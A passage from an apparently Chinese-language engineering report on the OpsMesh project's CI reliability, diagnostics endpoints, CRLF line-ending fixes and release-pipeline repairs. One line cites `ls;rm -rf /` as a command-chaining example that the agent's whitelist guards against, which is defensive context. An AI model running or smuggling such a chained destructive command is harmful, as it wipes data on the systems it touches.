| build-test | 编译 / vet / golangci-lint / gofmt / 分批单测 + 覆盖率合并全过（**首跑曾因 OOM flaky 红过一次，见下**） |
| Frontend / proto / services / integration / Race detector / security / E2E×2 | 同 §15.1，本轮复跑全绿 |
| **image** | 推送 `ghcr.io/levango7/opsmesh-binary:0a1c81d…@sha256:5ede994378c5f4905a444f63f…`；Trivy 通过；SBOM `包条目数: 89`；**keyless 签名成功**（`tlog entry created with index: 2957978033` + `Pushing signature to: ghcr.io/levango7/opsmesh-binary`） |
| **image-agent** | 推送 `ghcr.io/levango7/opsmesh-agent:0dc4ece…@sha256:962c212…`；Trivy 通过（`ignore-unfixed` 生效）；SBOM `包条目数: 172`；keyless 签名成功 |
| release | 设计内 skip（`refs/tags/v` 才触发） |

**新发现的第二个 CI 可靠性问题：`build-test` 的内存 OOM flaky**（run `36155335631` 首跑）

- 现象：`Test (unit, memory store, -race + coverage)` 红，但日志里 `./internal/agent/` 批次最后一个用例是 `--- PASS`、随后才崩：
  `fatal error: runtime: cannot allocate memory`（堆栈里是 GC worker）→ **测试全绿却被判红**。
- 与代码无关：该步骤注释本身即写明「无 race 下仍 7GB OOM（瞬时分配峰值），GOMEMLIMIT 让 GC 提前介入」；同一 commit **重跑即绿**（`gh run rerun`）。
- 影响被放大：`build-test` 是唯一门禁，它一挂，**7 个下游 job 全部 skip**（本轮首跑即如此，镜像链路没验到，只能重跑）。
- 严重性：**间歇性红**与长期红同属「门禁不可信」——都会训练人忽略它。建议后续单独处理（把 agent 批次拆得更细 / 降 `GOMEMLIMIT` / 分批之间显式 GC），本轮未改（改测试基础设施需独立验证）。

**至此的诚实边界**：`release` 按设计 tag 触发，未验；GitOps tag/digest 回写因无 `GITOPS_REPO`/`GITOPS_PAT` 仍未启用（job Summary 已显式标注「此段本次未验证」）；GHCR 包可见性由 GitHub 侧策略决定；CI 推的 leaf 名与仓库内 chart 的命名关系仍待与外部 GitOps chart 核对（§15.3）。



## 16. `build-test` 内存型 flaky：复核与处置（2026-09-26）

### 16.1 复核：旧解释未被复现

步骤注释（2026-08-31）把 agent 批的 OOM 归因为「测试期瞬时大分配 + GC 回收不及时在 7GB 物理限制下死亡」。2026-09-26 按**同一命令口径**（含 `-coverprofile`、`OPSMESH_TEST_BCRYPT_COST=4`、`GOMEMLIMIT=3GiB`）在本机分两半实跑：

| 批次 | 用例数 | 峰值堆（gctrace） | 退出码 | TestMain 泄漏检查 |
|---|---|---|---|---|
| `Test[A-I]` | 137 | **224 MB** | 0 | 未触发（存活 goroutine ≤600） |
| `Test[J-Z]` | 102 | **223 MB** | 0 | 未触发 |
| `Test[J-Z]`（不带覆盖率） | 101 | **227 MB** | 0 | 未触发 |

→ agent 批次**自身不占内存**（峰值 2 个数量级低于 7GB），「瞬时大分配打满 7GB」在当前代码上不成立。同时 `t.Parallel()` 在 `internal/agent`、`internal/store`、`internal/controlplane` 中出现次数均为 **0**，故包内并行也不是峰值来源。

### 16.2 证据限制（诚实说明）

那次崩溃（run `36155335631` attempt 1）的完整日志**已被 `gh run rerun` 覆盖**——GitHub 只保留最新 attempt 的日志（实测 attempt-1 的 job log 取回为 0 字节），因此**崩溃瞬间的运行时内存自述（`in use` 字节数、堆/栈占用）无法取回**。已知事实仅两条：① 崩溃发生在 `--- PASS` 之后（全部用例已通过，`FAIL … internal/agent 20.093s` 是进程非零退出所致，非断言失败）；② 判据是 Go 运行时的 `fatal error: runtime: cannot allocate memory`（mmap 型 ENOMEM），不是线程创建失败。**根因未定位**，只能确定「非 agent 测试自身的分配」。

### 16.3 处置（用户决策：测量 + 仅 OOM 重试一次）

`.github/workflows/ci.yml` 的 `Test (unit, memory store, -race + coverage)`：

1. **可观测**：新增 `mem_line()`（打印 `/proc/meminfo` 的 `MemTotal`/`MemAvailable`，缺 `MemAvailable` 时打印 `n/a` 而非误导性的 `0MB`）与 `run_batch()` 内的 **GNU time 峰值 RSS** 记录——`Maximum resident set size` / `Exit status` 随日志输出。GNU time 带**可用性探测**（`-v -o` 实测通过才启用），避免 BSD time 误用反而把步骤弄红。六个批次全部改走 `run_batch`，故每次运行都留下每批峰值 RSS。
2. **仅内存型死亡重试一次**：判据 `OOM_PAT = fatal error: runtime: (cannot allocate memory|out of memory) | ThreadSanitizer: internal allocator is out of memory`。命中即打 `::warning::`（含首次死因原文）后重试一次；**非内存型失败立即红**，**重试后仍失败也红** → 确定性回归不会被掩盖，门禁强度不变。
3. **修正注释**：保留 2026-08-31 的原始解释以备追溯，并就地标注本次复核结果（原文未被复现），避免后来者继续按错误前提排障。

### 16.4 本地实测（6 场景，全部符合预期）

| 场景 | 注入 | 期望 | 实测 |
|---|---|---|---|
| 1 成功 | 正常退出 | `[label] OK`，脚本继续 | ✅ |
| 2 非内存型失败 | `exit 1` + `--- FAIL` | `::error::`，脚本中止（rc=1） | ✅ |
| 3 OOM 一次后成功 | 首次 `cannot allocate memory` | warning + 重试 + OK（rc=0） | ✅ |
| 4 OOM 两次 | 两次 ENOMEM | warning → 重试 → `::error::`（rc=2） | ✅ |
| 5 TSan 分配器 OOM | `internal allocator is out of memory` | warning + 重试 | ✅ |
| 6 GNU time 路径 | 桩替 `-v -o` | 打印 `Maximum resident set size` | ✅ |

另：`bash -n` 通过；`actionlint v1.7.7` 对全部 workflow 仍 **0 问题**。

**诚实边界**：这是「让门禁可信 + 下次可诊断」，**不是**根因修复。若后续仍复现，按日志里的 `MemTotal`（区分 7GB/16GB runner）+ 每批峰值 RSS 继续定位；若确认是宿主级偶发，可再评估是否把 agent 批拆得更细。

## 17. P1-6 可支撑性：交付记录（2026-09-26）

§3 P1-6 的原文是「无版本端点、无 pprof、无配置转储、无诊断包；日志级别硬编码 Info；`/metrics` 抓取本身会做 4 次全表读」，商用影响为「客户现场排障必须 SSH + 看源码，支持成本高、无法远程定位问题」。

### 17.1 交付项

| 能力 | 端点/开关 | 鉴权 | 说明 |
|---|---|---|---|
| 版本与构建信息 | `GET /version` | 无（刻意，与 `/healthz` 同级） | 版本/提交/构建时间/Go 版本/GOOS·GOARCH/uptime + Go 内嵌 VCS 元信息（`vcs.revision`/`vcs.time`/`vcs.modified`） |
| 日志级别可配 | `--log-level` / `OPSMESH_LOG_LEVEL` | — | `debug\|info\|warn\|error`，默认 info；**非法值启动期 fail-fast** |
| 配置转储 | `GET /api/v1/admin/config` | `diagnostics:dump` | 脱敏后按 10 组呈现生效配置 |
| 诊断包 | `GET /api/v1/admin/diagnostics` | `diagnostics:dump` | zip：README + version/config/health + metrics + goroutines |
| 性能剖面 | `--debug-pprof` | 默认关 + `--metrics-allow-cidr` 准入 | `/debug/pprof/*`，生产空白名单即全拒（双层门槛） |

代码位：`internal/controlplane/support_endpoints.go`（+ `support_endpoints_test.go`）、`internal/logx/logx.go`、`pkg/log/log.go`、`internal/agent/agent.go`（任务生命周期 DEBUG 站点）、`internal/config/config.go`（两个新 flag）、`cmd/opsmesh/main.go`（`applyLogLevel`，三个入口共用）。

### 17.2 两个非显然的安全设计

1. **权限点命名刻意避开 `:read`**。RBAC 派生规则（`store.RolePermissions()`）把**所有** `*:read` 权限自动授予 `viewer`。若把新权限命名为 `diagnostics:read`，只读用户即可拉走配置转储（含内部拓扑）。故命名 `diagnostics:dump`：`viewer` 不匹配、`operator` 组不在其内、`admin` 自动获得全量 → 实际仅 admin 可用。
2. **脱敏采用白名单而非反射 + 字段名黑名单**。反射整个 `Config` 的失效方向是「新增一个 secret 字段就默认泄漏」；白名单的失效方向是「新字段看不到」（可被测试与人工发现）。敏感项一律只出 `*Configured: true|false`；URL 类字段（`--log-push-endpoint`/`--alert-webhook-url`/Loki/ES/OTel）经 `redactURL` 剥除 userinfo 与查询串——这类 URL 常被写成 `https://user:pass@host?token=…`，原样回显等于把凭证写进诊断包。

### 17.3 顺带修掉的三处静默失效（都是"声明了但没生效"类）

| # | 缺陷 | 为何此前不可见 | 实测证据 |
|---|---|---|---|
| 1 | **`-ldflags -X` 包路径全仓写错**：`.goreleaser.yml` 三行 + `Dockerfile.service` 一行写成 `opsmesh/internal/version.*`，模块实为 `github.com/Levango7/OpsMesh`；根 `Dockerfile`/`Dockerfile.agent`/`deploy/docker/Dockerfile.controlplane` 则完全没注入 | Go 链接器对不存在的 `-X` 符号**静默忽略**（构建成功、产物照跑、版本恒为默认 `0.9.0`/`dev`/`unknown`）；当前发布版本恰等于默认值，故 `--version` 看起来"对" | 用错误路径构建 → 版本仍报 `0.9.0`；用修正路径构建 → `opsmesh 9.9.9 (commit=abc1234 date=2026-09-26T00:00:00Z)`。已补 compose/CI 传 `VERSION/COMMIT/BUILD_DATE`，并在 `verify-runtime.sh` §15 加「`/version` 版本 == `.env` OPSMESH_VERSION」黑盒回归断言 |
| 2 | `logx.Warn(ctx, msg, nil)` 传裸 `nil` | slog 对奇数参数生成 `"!BADKEY":null`，日志仍可解析，只是**字段被吞**——而这条恰好是 demo 模式的安全告警 | 修复前后对比：`...用于生产","traceID":"","!BADKEY":null}` → `...用于生产","traceID":""}`。全仓扫描确认仅此一处 |
| 3 | `agent.go` 注释仍写「白名单只校验第一个 token」 | P1-1 已改为按段校验，注释未同步；读码者会据此误判安全边界（以为 `ls;rm -rf /` 只靠元字符检查兜底） | 已更正为按段校验语义，并说明元字符检查与白名单的互补关系 |

### 17.4 验证（真机 + 单测）

| 项 | 方式 | 结果 |
|---|---|---|
| 单元（端点） | `internal/controlplane/support_endpoints_test.go`：`/version` 字段与 405、配置快照脱敏与分组、admin/viewer/匿名三态、诊断包 zip 条目与鉴权、pprof 三态、`redactURL` 边界 | 全绿（7 用例） |
| **脱敏的机器可判定形式** | 14 个敏感字段各填哨兵 `SUPERSECRET-*`，对响应做**全字符串搜索**（而非逐字段检查） | 端点/快照/zip 全包均 0 命中 |
| 单元（日志） | `logx`：`ParseLevel` 10 输入（含大小写/空白/非法）、级别过滤三档、并发换级别 + 换输出（-race 在 CI 覆盖）；`agent`：DEBUG 生命周期站点 | 全绿；debug 站点输出 `"level":"DEBUG"` 且**不含命令内容** |
| 黑盒（独立实例，不触碰 prod 栈） | 临时端口 18099/19090/19091 起控制面，注入哨兵密钥 | `/version` 200；转储 2949B 无哨兵、`lokiEndpoint` → `https://loki.internal:3100/loki/api/v1/push`；诊断包 6612B/6 条目、`goroutines.txt` 125 行、`health.json` 正常；pprof 默认 **404**；CIDR 排除 **403**、放行 **200**；匿名读 `admin/config`+`admin/diagnostics` 均 **401** |
| 黑盒（级别透传） | `--log-level=warn` 实跑 | INFO=0 / WARN=3，且 `runtime.logLevel` 如实报 `warn`；`--log-level=bogus` → 退出码 1 + 明确错误 |
| 门禁 | `golangci-lint v2.13.2 ./...`、`gofmt -l .`、`go vet`、`actionlint v1.7.7`、`validate-deploy-assets.sh`、compose 渲染 | 全 0 问题；门禁 PASS=20 FAIL=0 SKIP=0；`build.args` 渲染为 `VERSION=0.9.0, COMMIT=dev, BUILD_DATE=unknown` |
| 回归 | `internal/controlplane` 40.9s、`internal/agent` 两半批、`pkg/log`、`internal/logx`、`internal/config`、`internal/store` | 全绿 |
| **真机全栈复验** | `deploy.sh up`（重建镜像）+ `verify-runtime.sh` | **PASS=101 / FAIL=0**（新增第 15 节 8 条：`/version` 200、**版本与 `.env OPSMESH_VERSION` 一致**、三字段齐备、pprof 出厂未注册 404、匿名读 `admin/config` 与 `admin/diagnostics` 均 401）；静态门禁 `PASS=22 FAIL=0 SKIP=0` |

### 17.5 P1-6 残留项的最终处置（同日追加）

| 残留项 | 结论 | 做法与边界 |
|---|---|---|
| `/metrics` 每次抓取做 4~5 次全量扫描 | **已修** | 新增 `internal/controlplane/metrics_cache.go`：应用级计数走 **TTL 缓存**（`--metrics-cache-ttl`，默认 1s，0=关闭）。8080 的 4 次与 9091 的 `SetAgents` 1 次合并进同一份快照（`appMetricsCounts`），同波抓取只算一次。失效方向刻意保守：**零值=不缓存**，故不经 `New()` 构造的既有测试路径行为逐字不变。顺带更正一处不实注释——旧注释称 9091「只做 O(1) 渲染」，实际它每次都全量扫 `Agents("")` |
| 无运行期日志级别开关（须重启） | **已修** | 新增 `POST /api/v1/admin/loglevel`（`{"level":"debug"}`）。理由：排障常是「复现→开 debug→拿到就关」，而重启本身会改变被观察状态（连接、leader、计数器归零）。权限刻意用 **`diagnostics:execute`**（不是 `diagnostics:dump`）：现场运维该能提级别，但不该因此看到含内部拓扑的配置转储；非法值返回 400 **且不改动当前级别** |
| 18 个微服务用标准库 `log`（无 JSON、无级别） | **管道已统一；逐点严重级别为增量项** | 规模：17 个 main.go、约 **301 处** stdlib 调用点。**没有做"一次性逐点改写"**——那需要给每一处判定严重级别，误判比没有级别更糟，且改动面无法在一次交付里验证。实际做法：`pkg/log.Init(serviceName)` **接管标准库默认 logger**，每服务 main 加一行即让该进程全部输出变成带 `service` 与 `via:"stdlib-log"` 的 JSON、并受 `OPSMESH_LOG_LEVEL` 控制（可解析 + 可控量，正是支持侧需要的两件事）。经此通道的行**一律如实记 INFO**——stdlib 的 `Printf` 不带级别信息，按文本前缀猜级别等于制造不实陈述。<br>真正有判别价值的那一类已经显式化：**47 处 `log.Fatal*` 全部改成 `lgr.Fatalf/lgr.Fatal`**（ERROR 级 + `fatal=true`，退出码 1 语义不变），实测崩溃行 `level=ERROR` 而正常启动行仍 `INFO`。剩余约 250 处 `Printf/Println` 的逐点升级（`Infof/Warnf/Errorf/Debugf` 已在 `pkg/log` 备好）为后续增量，不谎称已完 |
| 微服务模块此前不依赖根模块 | **已按需接线** | 11 个模块的 `go.mod` 补 `require github.com/Levango7/OpsMesh v0.0.0-…` + `replace … => ../../`（本地替换，不联网解析版本）。已实测 `Dockerfile.service` 在容器内可正常构建（其 `COPY pkg/ internal/` 早已存在，非新增上下文） |

**接线后的验证**：17 个服务模块逐个 `go build ./...` + `go test ./...` 全部通过；bot-svc 二进制实跑输出为合法 JSON（`level`/`msg`/`service`/`via`/`fatal` 字段齐备）；根模块 `gofmt`/`go vet`/`golangci-lint v2.13.2` 全 0 问题。

### 17.5.1 曾经的唯一未跑项（现已真机跑过，边界如下）

`verify-runtime.sh` 第 15 节的**第 9 条**断言（匿名 `POST /api/v1/admin/loglevel` → 401）此前
因 Docker Desktop 停机而未跑，只由 3 个单测覆盖（匿名 401 / viewer 403 / operator+admin 200）。

**2026-09-26 已用本机独立实例真机验证**（不必重建镜像：验的是运行期鉴权，同一份 HTTP 服务代码路径）：
以 `--store=memory --require-auth=true` 起在临时端口 18099/19090/19091，实测：

| 断言 | 结果 |
|---|---|
| 匿名 `POST /api/v1/admin/loglevel`（`{"level":"debug"}`） | **401**，响应体 `{"error":"missing identity (no bearer token or gateway role header)"}` |
| 匿名 `GET /api/v1/admin/config` / `GET /api/v1/admin/diagnostics` | **401 / 401** |
| `GET /version` / `GET /healthz` | 200 / 200 |
| `GET /debug/pprof/`（出厂未开 `--debug-pprof`） | **404** |
| 级别是否被匿名请求改动 | 未改（`/version` 的 `runtime.logLevel` 仍 info；进程随后销毁） |

**边界（不要读成"容器栈里也验过了"）**：这一条验的是**本机独立二进制实例**，
`verify-runtime.sh` 里针对**重建后的容器镜像**的同一条断言仍未跑（需 `deploy.sh up` 重建控制面镜像，
而本机 Docker 与 kind 集群、他人项目容器并存，重建栈的内存代价不该由这条断言来转嫁）。
取证坑一条，值得记住：`opsmesh serve --flag=…` 这类写法会让 **Go flag 包在第一个非旗标参数处停止解析**，
所有 `--flag` 被静默忽略、进程改用默认值（实测它去监听 8080 而不是我给的 18099）——
控制面是**单命令扁平旗标**，没有 `serve` 子命令。起实例后必须回读启动日志里的
`http/grpc/metrics` 三个端口字段确认旗标真的生效，别假设。

**另需记录的环境事实（与本仓库代码无关，但会污染本地计时类用例）**：Docker Desktop
在负载下整体停退，导致 `internal/agent` 的 Windows 计时阈值用例（`TestExecute_Timeout`
断言 <4.5s、`TestCollectDeviceMetrics_Throttle`）在本地跑出 27s / 43s——
用 git worktree 取**改动前**的同一提交在同负载下复跑，**失败且更慢**，故已证明非回归；
CI（Linux、独立 runner）这两个用例本轮为绿。

## 18. 附：部署资产行尾一致性（CRLF）——故障注入抓出的一整类缺陷（P0-4 同级：Windows 上开箱即坏）

给门禁做故障注入时发现并修掉的一整类问题。**证据链**：

1. 对照实验——同一 Dockerfile，只改行尾：
   `LF → docker build 成功`；`CRLF → ERROR: failed to solve: dockerfile parse error on line 3: unknown instruction: &&`。
   原因是 `RUN ... \` 续行的行尾变成 CR+LF，Docker 解析器识别不到续行，把下一行当指令。
2. `.gitattributes` 原本只钉了 `*.go`/`*.sh`/`*.yml`/`*.yaml`/`Makefile`/`*.md`，**没有覆盖 Dockerfile 与 `.dockerignore`**；
   而本机 `core.autocrlf=true` → Windows 检出即 CRLF。CI 永远在 Linux 上跑（检出必为 LF），
   所以**这类缺陷在流水线上不可见**，只在客户/开发者 Windows 机器上炸。
3. 门禁上线即抓出三个既有 CRLF 文件（仓库内均为 LF，仅本机检出态为 CRLF）：
   `.dockerignore`(66 处 CR)、`operator/Dockerfile`(27)、`deploy/helm/opsmesh/templates/_helpers.tpl`(130)。
   其中 `.dockerignore` 尤其危险——带 CR 的模式（如 `web/\r`）匹配不到路径，会**静默失效**，
   而这正是 P0-3「企业版前端无交付路径」的根因文件（见 §13.8 与 `.dockerignore` 内的警示注释）。
4. 修法：`.gitattributes` 增补 `[Dd]ockerfile*` / `*.dockerfile` / `.dockerignore` / `*.tpl` / `*.yaml` / `*.json` /
   并给 `.gitattributes` 自身钉 `eol=lf`；已用 `git add --renormalize` + `tr -d '\r'` 把工作区归一到 LF
   （三文件归一后 `git diff` 为空 → 仓库内容本就 LF，只是检出形态错）。

**过程中踩到的两个坑（写给后续维护者）**：

- **`grep`/`awk` 在 Git-Bash 下看不见 CR**：对确认含 CRLF 的文件，`grep -c $'\r'` 与 `awk '/\r/'` 都返回 0
  （MSYS 文本模式在读时吞 CR），只有 `tr -d '\r'` 走字节路径可见（实测 32 → 31 字节）。
  ⇒ 用 grep 写的 CRLF 门禁**在 Windows 上是空转的**，而这恰是它唯一要防的平台。第一版就是这样，
  是故障注入（放一个含 CRLF 的探针文件）把它抓出来的——**没有注入，这道门禁会以"永远 PASS"的形态骗过所有人**。
  现改用 `wc -c` 与 `tr -d '\r' | wc -c` 的字节数比对。
- **`.gitattributes` 的注释里不能出现真 CR/LF**：写注释时误插入一个真实换行，使半截注释没有 `#` 前缀，
  git 遂把它当规则解析，**每一次 git 调用都吐 `... is not a valid attribute name: .gitattributes:25`**。
  修完顺手给该文件自己钉上 `eol=lf`。

**新增永久门禁**：`deploy/scripts/validate-deploy-assets.sh` 第 6 节「行尾一致性」——
扫描 Dockerfile/`.dockerignore`/compose/`*.sh`/Helm 模板/Chart·values，任一含 CR 即 FAIL 并点名；
另用 `git check-attr eol -- Dockerfile` 断言属性真的生效（问 git 而非解析文件，避免规则写法差异导致误判通过）。
故障注入双向验证：放探针文件 → `FAIL=1` 且点名；撤掉 → `PASS=22 FAIL=0`。

**本节自身也曾带病（2026-09-26 复扫发现并修掉）**：报告文件里曾残留 **6 个裸 CR 字节**，位置恰是
正文写 `tr -d '<CR>'`、`grep -c $'<CR>'`、`awk '/<CR>/'` 的地方——早先用 here-doc 批量改文档时，
`\r` 转义被 shell 吃掉、落地成真 CR。后果不是行尾不一致（这些行其余部分是 LF，门禁的行尾检查未必抓得到），
而是**文档里教的那条命令是错的、且看起来是对的**。修法同样要绕开文本模式：
MSYS 下的 `sed`/`perl` 因读写两侧都做 CRLF 转换，替换看似执行、字节数却纹丝不动；
只有 Node 以 latin1 读入、按字节 split/join 才真的把 1 字节换成 2 字节（149941 → 149947，CR 计数 6 → 0）。
教训并入教训 11 那一类：**校验工具的输入通道本身会骗人**（grep 看不见 CR、sed/perl 会吞 CR）。

## 19. 发布链路复核：当前对外版本的容器镜像从来没有构建成功过（2026-09-26）

§15 把 CI 的 12 个 job 拉成真跑全绿之后，回头核对"客户到底能装到什么"，发现发布链路仍有一个
**已发生但无人察觉**的硬伤。三条独立实测证据：

| # | 事实 | 取证方式 |
|---|---|---|
| 1 | **`v0.9.1` 的微服务镜像一张都没有**：`ghcr.io/levango7/auth-svc` 的 tag 集里只有 `0.8.0`、`0.9.0`、`latest` 与若干 sha，**没有 `0.9.1`**（`/v2/.../manifests/0.9.1` → 404） | 匿名向 GHCR 换 pull token 后查 manifest（Accept 必须含 `application/vnd.oci.image.index.v1+json`，否则 OCI index 会被误报成 404——本轮先踩了这个坑） |
| 2 | **GitHub Release `v0.9.1` 有 0 个产物**（`assets=0`），而 `release.yml` 的 `github-release` job 结论是 `skipped`、`ci.yml` 的 `release` job 也因 `build-test` 红而 `skipped` → 两条发布路径都没上传任何东西 | `gh release view v0.9.1 --json assets` + 两个 run 的 job 级结论 |
| 3 | **release run `35129758414` 的失败原因是构建模板自身**：`ERROR: failed to build: failed to solve: failed to compute cache key: "/go.work.sum": not found`，18 条矩阵 1 红 17 cancel | `gh run view --job 104907540361 --log-failed` |

### 19.1 根因（一行 COPY）

- `.gitignore:91` 明确排除 `go.work.sum`（"自动生成，无需版本控制"）→ **干净检出里没有这个文件**。
- `Dockerfile.service:20` 却写 `COPY go.work go.work.sum ./` → 构建上下文缺文件，buildx 直接失败。
- 时间线自洽：`go.work` 系列改动在 2026-09-01 之后落地，因此 v0.8.0/v0.9.0 的镜像还在，
  v0.9.1 起全灭；而 **`Dockerfile.service` 只在 `git tag v*` 时才第一次被执行**，所以缺陷潜伏了整整两个版本。

**反证（决定修法方向）**：CI 的 `services` job 在同一干净检出（无 go.work.sum）下对 17 个服务模块逐个
`go build ./...` 全绿 ⇒ workspace 缺 sum 文件不影响构建；各模块自己的 `go.sum` 仍会被 COPY，
`go mod download` 在 workspace 模式下自行补齐 go.work.sum。因此**修 COPY，而不是把 go.work.sum 塞进版本库**
（后者会引入"tracked 但没人负责保鲜"的新陈旧源，且没有任何门禁保证它与 go.work 同步）。

### 19.2 处置

| 改动 | 内容 |
|---|---|
| `Dockerfile.service` | `COPY go.work go.work.sum ./` → `COPY go.work ./`，并把上述根因/反证写成注释 |
| `ci.yml` 新增 `release-dryrun` job | 每次 push 用**同一套发布模板**构建 `auth-svc`（`--load`，不推送、不登录、不扫描），再自检产物：入口 `/usr/local/bin/svc` 存在、是 ELF（`7f 45 4c 46`）、且容器内**非 root**。零 secret 依赖，因此任何分支都能跑 |
| `ci.yml` 的 `release` job | `needs` 追加 `release-dryrun`：**镜像模板产不出产物就不发布版本化二进制**；同时删掉原注释里"services job 验证的就是矩阵镜像的可构建性"这句不实安心——它验证的是源码能编译，验证不了镜像能构建，这正是本缺陷能活到发版才爆的原因 |

### 19.3 与既有教训的关系（第四类假绿的变体）

§15.2 定义过"空转绿"（有 `if:` 守卫但条件永远不满足）。本轮是它的**镜像面**：
步骤本身没有守卫、逻辑也没错，只是**它只在发版那一刻才第一次执行**。同一个仓库里等价的两类问题——
"从未跑过的门禁"与"只在生产时刻跑的门禁"——都不会在常规 CI 里暴露，因此必须显式把发布路径
（构建产物、渲染 chart、拉起栈）**复制成 push 期就执行的检查**，否则发布永远是人肉首跑。

### 19.4 当时留下的待决项（其中 1 已在 §20 处理；2 的版本动作待授权；3 已核实）

1. **核心镜像命名与 chart 默认值不一致**：CI 推 `ghcr.io/levango7/opsmesh-binary` / `opsmesh-agent`，
   而 `deploy/helm/opsmesh/values.yaml`（及 `values-production.yaml`）默认
   `repository: opsmesh/opsmesh`、`tag: latest`——`helm template` 实测渲染即 `image: opsmesh/opsmesh:latest`，
   **本仓库任何 workflow 都不发布这个名字**，Helm 客户开箱即 `ErrImagePull`。
   同时 CI 对这两个镜像**只推 sha 标签**（实测 `latest`、`0.9.0` 均 404），所以即便改名也对不上默认 tag；
   16 个微服务段默认 `ghcr.io/levango7/<svc>:latest` 反而真实存在（auth-svc 实测有 latest/0.8.0/0.9.0）。
   `docs/deployment-guide.md` 与 `docs/deployment-scenarios.md` 沿用了同一错名，
   且示例把 `global.imageRegistry` 写成带尾斜杠并与 `repository` 重复命名空间（helper 直接拼接会产出 `//`）。
   → 需要决策的是**对外发布产物形态**（是否追加 `latest`/semver 标签会改变 GHCR 上的公共可见物），故未擅动。
2. **重切版本**：v0.9.1 既无镜像也无二进制，而 P0-1/P0-3/P0-5/P0-6、P1-1~P1-6 全部修复都在其后。
   对外可售的最低事实是"存在一个版本，其镜像与二进制都真的发布成功"——目前不满足。
   待 §19.2 的门禁在 CI 真跑绿后，建议切 `v0.9.2` 并以 release run 的 job 级日志（非状态码）验收。
3. **GHCR 可见性已核实**（关闭 §15.5 的一条诚实边界）：`levango7/opsmesh-binary` 匿名 pull token
   即可取 `tags/list`（200）并解析 manifest → **包是公开的**，无需登录即可拉取。

### 19.5 `c6f0a2e` 的本地三重验证 + 首跑暴露的第三条真缺陷（2026-09-26）

**本地验证（用户授权启动 Docker Desktop 后）**——用 `git archive HEAD` 造出与 CI 逐字等价的
干净上下文（`go.work` 在、`go.work.sum` **不在**，实测该目录里只有 `go.work`）：

| 场景 | 命令要点 | 结果 |
|---|---|---|
| ① 故障注入（复刻修复前的 COPY 行） | `COPY go.work go.work.sum ./` | **rc=1**，且报错与 release run 逐字相同：`failed to compute cache key: … "/go.work.sum": not found` ⇒ 复现成立，根因确认 |
| ② 修复后的 COPY 行 | `COPY go.work ./` + 其余 5 条 COPY | **rc=0**（`PROBE_NEW_PASSED`）⇒ 修复对根因有效 |
| ③ 端到端：HEAD 的真实发布模板 | `docker buildx build --file Dockerfile.service --build-arg SERVICE=auth-svc --load` | **rc=0**，走完 `go mod download && go mod verify` + Go 编译 + alpine 运行层，导出 digest `sha256:1aa3782…` |
| ④ 新门禁自检逐字实跑 | ③ 的产物按 `release-dryrun` 里那段 shell 原样检查 | `dryrun 产物 OK：ELF 入口存在且以非 root 运行`（**这段是 ci.yml 里一字未改的原文**，所以首跑不会因语法/`od` 输出格式而红） |
| ⑤ 自检的反向对照 | 同段检查换到一个没有 `/usr/local/bin/svc` 的镜像 | 打印「缺可执行入口」并非零退出 ⇒ 这道门禁**不是永远 PASS**（教训 11 的规矩） |
| ⑥ 附带证据 | `grep -a -c dryrun /usr/local/bin/svc` | 命中 ⇒ §17.3 的 `-X` 版本注入在**微服务镜像**上真的生效（此前只在控制面上验过） |

**首跑（run `36188672870`）判红，但红得有价值**：`build-test` 的 `Test (unit, -race + coverage)`
失败 → 10 个下游（含 `release-dryrun`）全部 skip。下钻 step 级日志不是 OOM 而是断言失败：

```
--- FAIL: TestLogCollectorRateLimit (0.06s)
    log_collect_test.go:420: TotalLines 期望 >=10, 得到 0
```

这条**不是「计时用例不稳」那种可以糊过去的红**，而是被测代码里一个真实的计数可见性缺陷：
`collectFile` 把 `stats.lines` 记在**本地**、把 `Dropped` 直接**原子写全局**，两者的可见时机不同；
测试（以及运维读的同一份 `Stats()`）在 `Dropped>0` 的那一刻跳出等待，就会读到
`Dropped>0 且 TotalLines=0` 这个自相矛盾的中间态。

- **复现**：用 `git worktree` 取改动前的同一提交，`-run TestLogCollectorRateLimit -count=400`
  → **2 次失败**，报错逐字相同（`得到 0`）。⇒ 间歇性是调度决定的，缺陷本身是确定的。
- **修法**：`dropped` 改为与 `lines` 同样的本地增量，由调用方在 **lines/bytes 之后**统一落账
  （`internal/agent/log_collect.go`）⇒ 任何时刻「`Dropped>0`」都必然伴随已结算的 `TotalLines`。
  语义总量不变，只改可见顺序；不放宽任何断言、不给测试加 sleep。
- **验证**：修复后 `-count=800` **0 失败**；`internal/agent` 全包 `-count=1` 绿（86.6s）；
  `golangci-lint`（CI 钉死版本）`0 issues`、`gofmt -l .` 干净。
- **顺带确认门禁 integrity**：这次失败**没有**触发 OOM 重试路径（§16.3 的重试只认内存型死亡），
  说明「只重试内存型死亡」的边界是真的在按性质分流，而不是把红洗成绿。

### 19.6 v0.9.2 第一次真发版就红：矩阵里混进了一个**不是服务**的模块（2026-09-26）

修完 §19.1 之后第一次真跑发布链路（tag `v0.9.2` → run `36217841524`）仍然没出产物，但**根因换了一层**：

```text
build-and-push (tf-provider)  → failure  Build Docker image
  #21 0.407 stat /src/services/tf-provider/cmd/tf-provider: directory not found
  ERROR: failed to build: failed to solve
build-and-push (其余 16 个)     → cancelled（矩阵 fail-fast）
github-release                 → skipped   ⇒ Release 资产仍是 0
```

- **为什么 §19.1 修好了它 yet 看不见**：`Dockerfile.service` 硬编码 `-o /svc ./cmd/${SERVICE}`，
  而 18 个模块里 17 个遵守这个布局、`tf-provider` 的 `main.go` 在模块根。常规 CI 两层都盖不住：
  `services` job 跑 `go build ./...`（不假设 cmd 布局），`release-dryrun` 只构建 **auth-svc 一个样本**
  ——dryrun 的价值被样本选择限制住了。**"样本能建"不等于"矩阵能建"**，这是 §19.3 那条的变体。
- **但真正的问题不是路径，是矩阵的成员资格**：`tf-provider` 是 Terraform 插件
  （`main.go` 里 `plugin.Serve`）。就算把构建目标修对，镜像里 `CMD ["svc"]` 一启动就会打印
  "This binary is a plugin" 并以码 1 退出 ⇒ **发布一个必定 CrashLoop 的产物**比不发更糟。
  且全仓没有任何部署清单引用它（实测 `grep tf-provider deploy/ operator/` 为空），
  Helm chart 也本来就不含它（门禁第 2 节的 INFO 早就说了）。
- **处置（不是"让构建通过"，而是"停止发布错误产物"）**：从镜像矩阵移除 `tf-provider`，
  并把"哪些模块不是服务"变成**带理由的显式豁免表**。它仍被 `services` job 逐个 `go build ./...` 覆盖，
  编译与测试覆盖度**一点没少**。
- **两条防复发门禁**：① 第 2 节改为比对「矩阵 ∪ 豁免表」而不是只比矩阵——这样新增非服务模块仍会被逼着
  表态（进矩阵或进豁免表），而不是靠放宽对齐规则消红；② 新增第 10 节，静态断言矩阵里每个服务
